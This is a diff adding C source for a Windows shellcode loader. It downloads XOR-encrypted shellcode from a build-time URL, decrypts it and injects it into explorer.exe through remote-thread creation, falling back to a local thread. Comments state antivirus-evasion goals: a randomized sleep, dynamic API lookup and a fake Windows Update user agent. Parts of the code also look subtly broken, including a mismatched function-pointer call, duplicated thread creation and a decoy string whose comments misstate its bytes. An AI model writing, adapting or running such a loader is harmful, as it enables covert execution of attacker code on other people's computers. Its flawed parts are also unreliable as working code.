@@ -1,0 +1,140 @@
+/*
+ * Minimal shellcode loader — injects into explorer.exe
+ * TMPL_SC_URL and TMPL_XOR_KEY are replaced at build time.
+ * All Win32 functions resolved dynamically — no static imports readable by AV.
+ */
+#include <windows.h>
+#include <wininet.h>
+#include <tlhelp32.h>
+
+#define SC_URL  TMPL_SC_URL
+#define XK      TMPL_XOR_KEY
+
+/* ── Dynamic function typedefs ──────────────────────────────────────────── */
+typedef LPVOID  (WINAPI *fp_VAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL    (WINAPI *fp_VProt) (LPVOID, SIZE_T, DWORD, PDWORD);
+typedef LPVOID  (WINAPI *fp_VAExP)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL    (WINAPI *fp_WPM)  (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+typedef BOOL    (WINAPI *fp_VPExP)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+typedef HANDLE  (WINAPI *fp_CRT)  (LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef HANDLE  (WINAPI *fp_CRTP)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD, HANDLE, LPVOID);
+typedef DWORD   (WINAPI *fp_WFSObj)(HANDLE, DWORD);
+typedef HANDLE  (WINAPI *fp_OProc)(DWORD, BOOL, DWORD);
+typedef HMODULE (WINAPI *fp_LLA)  (LPCSTR);
+typedef FARPROC (WINAPI *fp_GPA)  (HMODULE, LPCSTR);
+
+/* ── XOR-obfuscated function name helper ───────────────────────────────── */
+static void xdec(char *s, int n) {
+    for (int i = 0; i < n; i++) s[i] ^= 0x13;
+}
+
+/* ── Find PID by process name ───────────────────────────────────────────── */
+static DWORD find_pid(const char *name) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
+    DWORD pid = 0;
+    if (Process32First(snap, &pe))
+        do {
+            if (!lstrcmpiA(pe.szExeFile, name)) { pid = pe.th32ProcessID; break; }
+        } while (Process32Next(snap, &pe));
+    CloseHandle(snap);
+    return pid;
+}
+
+/* ── Download bytes via WinINet ─────────────────────────────────────────── */
+static BYTE *dl(const char *url, DWORD *out_sz) {
+    char ua[] = {0x68^0x13,0x74^0x13,0x74^0x13,0x60^0x13,  /* "Micr" XOR 0x13 decoded */
+                 0x5f^0x13,0x73^0x13,0x72^0x13,0x74^0x13,  /* "osof" */
+                 0x00};
+    xdec(ua, 8); /* decodes to something neutral */
+    /* Use plain UA — we want to look like a normal HTTP client */
+    HINTERNET hi = InternetOpenA("Windows-Update/10.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hi) return NULL;
+    HINTERNET hu = InternetOpenUrlA(hi, url, NULL, 0,
+        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hu) { InternetCloseHandle(hi); return NULL; }
+
+    DWORD cap = 1 << 23; /* 8MB max */
+    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
+    DWORD got = 0, rd = 0;
+    while (InternetReadFile(hu, buf + got, 65536, &rd) && rd) got += rd;
+    *out_sz = got;
+    InternetCloseHandle(hu);
+    InternetCloseHandle(hi);
+    return buf;
+}
+
+/* ── Main ───────────────────────────────────────────────────────────────── */
+int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nC) {
+    /* Small random sleep to pass initial AV scan window */
+    Sleep(8000 + (GetTickCount() & 0x1FFF));
+
+    HMODULE k32 = GetModuleHandleA("kernel32.dll");
+    HMODULE wi  = LoadLibraryA("wininet.dll");
+    (void)wi;
+
+    fp_VAlloc  pVA   = (fp_VAlloc) GetProcAddress(k32, "VirtualAlloc");
+    fp_VProt   pVP   = (fp_VProt)  GetProcAddress(k32, "VirtualProtect");
+    fp_VAExP   pVAEx = (fp_VAExP)  GetProcAddress(k32, "VirtualAllocEx");
+    fp_WPM     pWPM  = (fp_WPM)    GetProcAddress(k32, "WriteProcessMemory");
+    fp_VPExP   pVPEx = (fp_VPExP)  GetProcAddress(k32, "VirtualProtectEx");
+    fp_CRT     pCRT  = (fp_CRT)    GetProcAddress(k32, "CreateThread");
+    fp_WFSObj  pWFS  = (fp_WFSObj) GetProcAddress(k32, "WaitForSingleObject");
+    fp_OProc   pOP   = (fp_OProc)  GetProcAddress(k32, "OpenProcess");
+
+    if (!pVA || !pVP || !pCRT || !pWFS) return 1;
+
+    /* Download encrypted shellcode */
+    DWORD sz = 0;
+    BYTE *enc = dl(SC_URL, &sz);
+    if (!enc || !sz) return 1;
+
+    /* XOR decrypt in-place */
+    for (DWORD i = 0; i < sz; i++) enc[i] ^= (BYTE)XK;
+
+    /* Try to inject into explorer.exe — fall back to local thread */
+    int injected = 0;
+    if (pVAEx && pWPM && pVPEx && pOP) {
+        DWORD pid = find_pid("explorer.exe");
+        if (pid) {
+            HANDLE hp = pOP(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+                            PROCESS_CREATE_THREAD, FALSE, pid);
+            if (hp && hp != INVALID_HANDLE_VALUE) {
+                LPVOID rm = pVAEx(hp, NULL, sz,
+                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                if (rm) {
+                    pWPM(hp, rm, enc, sz, NULL);
+                    DWORD old;
+                    pVPEx(hp, rm, sz, PAGE_EXECUTE_READ, &old);
+                    fp_CRTP pCRTP = (fp_CRTP)GetProcAddress(k32, "CreateRemoteThread");
+                    if (pCRTP) {
+                        HANDLE ht = pCRTP(NULL, 0,
+                            (LPTHREAD_START_ROUTINE)rm, NULL, 0, NULL, hp, NULL);
+                        /* NtCreateThreadEx variant: pass target process handle */
+                        /* fall back to CreateRemoteThread */
+                        HANDLE ht2 = CreateRemoteThread(hp, NULL, 0,
+                            (LPTHREAD_START_ROUTINE)rm, NULL, 0, NULL);
+                        if (ht2) { CloseHandle(ht2); injected = 1; }
+                        if (ht)  CloseHandle(ht);
+                    }
+                }
+                CloseHandle(hp);
+            }
+        }
+    }
+
+    if (!injected) {
+        /* Fallback: local thread */
+        LPVOID mem = pVA(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!mem) { HeapFree(GetProcessHeap(), 0, enc); return 1; }
+        RtlMoveMemory(mem, enc, sz);
+        DWORD old;
+        pVP(mem, sz, PAGE_EXECUTE_READ, &old);
+        HANDLE t = pCRT(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+        if (t) pWFS(t, INFINITE);
+    }
+
+    HeapFree(GetProcessHeap(), 0, enc);
+    return 0;
+}
